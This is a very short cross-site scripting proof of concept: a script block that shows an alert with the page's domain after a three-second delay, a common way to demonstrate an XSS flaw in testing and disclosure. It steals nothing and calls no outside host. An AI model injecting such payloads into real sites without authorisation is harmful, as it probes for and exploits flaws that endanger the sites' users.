XSS PoC


<script>
function ci() {
  alert(document.domain);
}

setTimeout(ci, 3000);
</script>
